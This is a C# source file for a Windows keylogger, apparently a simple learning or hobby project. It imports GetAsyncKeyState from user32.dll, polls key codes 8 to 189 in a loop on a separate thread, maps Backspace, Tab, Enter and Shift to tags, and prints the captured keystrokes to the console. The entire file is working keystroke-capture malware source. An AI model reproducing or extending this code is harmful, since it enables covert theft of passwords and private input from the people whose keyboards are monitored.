using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;//to thread keylogger
using System.Runtime.InteropServices; //to import window DLL

namespace keylog
{
    class Program
    {
        
        
        //to stop keylogging
        public bool Tracking = false;
        //to store keystroke temporarily
        public string Store = "";
        //import DLL, and logging function
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int key);
        
        public void StoreKey()
        {
            this.Tracking = true;
            int key;
            while (this.Tracking)
            {
                for(key =8; key <190; key++)
                {
                    if(GetAsyncKeyState(key) == -32767)
                    {
                        this.Verify(key); //to decipher pressed keys

                    }
                }
            }
        }

        public void Verify(int Code)
        {
            switch (Code)
            {
                //for backspace
                case 8:
                    if (!string.IsNullOrEmpty(this.Store))
                    {
                        this.Store = this.Store.Substring(0, this.Store.Length - 1);
                    }
                    break;
                //tab
                case 9:
                    this.Store += "   ";
                    break;

                //ENTER
                case 13:
                    this.Store += "[ENTER]";
                    break;

                //SHIFT
                case 16:
                    this.Store += "[SHIFT]";
                    break;

                default:
                    this.Store += (char)Code;
                    break;
            }

            //logged if keystroker more than X

            if(this.Store.Length >= 3)
            {
                Console.Write(this.Store);
                this.Store = "";
            }

        }

        //threading
        public void KeyThreading()
        {
            new Thread(new ThreadStart(this.StoreKey)).Start();
        }

        public static void Main()
        {
            Program p = new Program();
            p.KeyThreading();
        }
        
       /* static void Main(string[] args)
        {
        }
        */
    }
}
